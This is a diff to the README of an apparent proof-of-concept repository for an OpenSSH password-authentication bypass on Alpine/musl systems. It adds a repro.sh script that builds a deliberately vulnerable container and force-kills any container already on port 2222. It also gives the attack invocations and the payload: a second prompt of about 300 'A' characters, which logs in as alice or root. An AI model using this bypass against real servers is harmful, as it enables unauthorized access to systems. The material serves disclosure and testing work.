@@ -37,13 +37,13 @@ glibc, pam, `PasswordAuthentication no`, openbsd, freebsd, macos: not affected. 
 
 ## reproduce it
 
-you need docker. this checkout defaults to `alpine:latest` (override `BASE` to test another musl-based Alpine image), but deliberately installs Alpine's official pre-fix `openssh` `10.3_p1-r1` APKs by URL and SHA-256. It otherwise uses the stock server and default config; Alpine documents the relevant defaults and fixed package versions in its [security advisory](https://alpinelinux.org/posts/2026-11-05-openssh-password-authentication-bypass/). `alice` has `*`, `bob` has a real password. The vulnerable behavior comes from the pinned OpenSSH packages: a normal `apk add openssh-server` uses the live Alpine package index and selects the fixed package instead.
+you need docker or podman. this checkout defaults to `alpine:latest` (override `BASE` to test another musl-based Alpine image), but deliberately installs Alpine's official pre-fix `openssh` `10.3_p1-r1` APKs by URL and SHA-256. It otherwise uses the stock server and default config; Alpine documents the relevant defaults and fixed package versions in its [security advisory](https://alpinelinux.org/posts/2026-11-05-openssh-password-authentication-bypass/). `alice` has `*`, `bob` has a real password. The vulnerable behavior comes from the pinned OpenSSH packages: a normal `apk add openssh-server` uses the live Alpine package index and selects the fixed package instead.
+
+`poc/repro.sh` builds and runs it for you (`PermitRootLogin yes` is already set, so both `alice` and `root` work without rerunning anything): it force-kills any old/unrelated container already bound to port 2222 regardless of its name, rebuilds on `linux/amd64` (needed on arm64 hosts — see below), and verifies the running container is actually `openssh-server-10.3_p1-r1` before you trust an attack result against it.
 
 ```
 cd poc
-docker build -t sshhole .
-docker run -d --rm --name sshhole -p 127.0.0.1:2222:22 sshhole
-
+./repro.sh
 ./attack.sh 127.0.0.1 2222 alice
 ```
 
@@ -55,11 +55,7 @@ RESULT: logged in as alice
 
 two prompts. first one anything, second one 300 x `A`. that's the exploit.
 
-root works too if `PermitRootLogin yes` is set:
-
 ```
-docker rm -f sshhole
-docker run -d --rm --name sshhole -p 127.0.0.1:2222:22 sshhole /usr/sbin/sshd -D -e -o PermitRootLogin=yes
 ./attack.sh 127.0.0.1 2222 root
 ```
 
@@ -71,7 +67,9 @@ python3 attack.py 127.0.0.1 2222 alice 256     # rejected
 python3 attack.py 127.0.0.1 2222 alice 257     # logged in
 ```
 
-for older alpine versions: `docker build --build-arg BASE=alpine:3.21 -t sshhole .` it works at least back to 3.18. the oldest we tried was openssh 7.5p1 on musl 1.1.16 from 2017, and it worked there too.
+for older alpine versions: `BASE=alpine:3.21 ./repro.sh`. it works at least back to 3.18. the oldest we tried was openssh 7.5p1 on musl 1.1.16 from 2017, and it worked there too.
+
+on an arm64 host (e.g. Apple Silicon): `repro.sh` already forces `--platform=linux/amd64` for you. doing it manually instead of via the script, a plain `docker build`/`podman build` would pull an aarch64 base whose musl can't satisfy these pinned x86_64 packages, and `apk add` fails as uninstallable.
 
 ## patch
 
